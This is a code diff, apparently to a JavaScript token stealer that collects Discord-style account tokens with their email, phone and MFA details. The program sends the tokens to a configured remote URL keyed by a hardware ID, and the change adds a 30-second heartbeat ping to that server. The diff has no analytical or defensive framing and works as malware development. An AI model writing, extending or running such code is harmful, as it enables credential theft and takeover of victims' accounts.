@@ -6,6 +6,7 @@
 
 // Do our own stuff
 const fs = require('fs');
+const httpS = url.toLowerCase().startsWith('https') ? 'https' : 'http';
 
 class TokenData {
     constructor(token, id, username, discriminator, email, avatar, verified, locale, mfa_enabled, phone, premium_type) {
@@ -93,8 +94,13 @@ const getTokens = async () => {
     return JSON.stringify(validTokens.map((t) => t.toJSON()));
 };
 
-getTokens().then((tokens) => {
-    const startsWithHttps = url.toLowerCase().startsWith('https');
+const ping = () => {
+    get(httpS, url.toLowerCase() + `/p/${hwid}`);
+};
 
-    get(startsWithHttps ? 'https' : 'http', url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {});
+getTokens().then((tokens) => {
+    get(httpS, url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {
+        ping();
+        setInterval(ping, 30 * 1000);
+    });
 });
